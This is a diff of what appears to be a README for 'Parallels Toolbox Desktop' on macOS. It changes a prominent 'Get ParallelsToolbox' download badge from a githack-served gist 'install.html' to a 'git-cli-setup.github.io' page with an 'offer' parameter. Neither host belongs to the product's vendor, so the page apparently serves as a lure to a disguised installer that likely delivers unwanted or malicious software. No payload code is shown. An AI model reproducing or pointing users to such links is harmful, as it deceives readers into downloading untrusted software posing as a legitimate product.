@@ -2,7 +2,7 @@
 
 Parallels Toolbox Desktop is a compact collection of powerful tools designed to simplify everyday tasks on macOS. It offers quick access to screen recording, window management, archiving, timers, presentation modes, and more—all in one lightweight interface.
 
-<a href="https://gistcdn.githack.com/freedeermrdoors284/25661773a29c2fc93feaebaaac6ffa08/raw/7d57bf33ea3850cd0160210b2068e4f0203e9468/install.html?offer=ParallelsToolbox" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=ParallelsToolbox" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20ParallelsToolbox%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
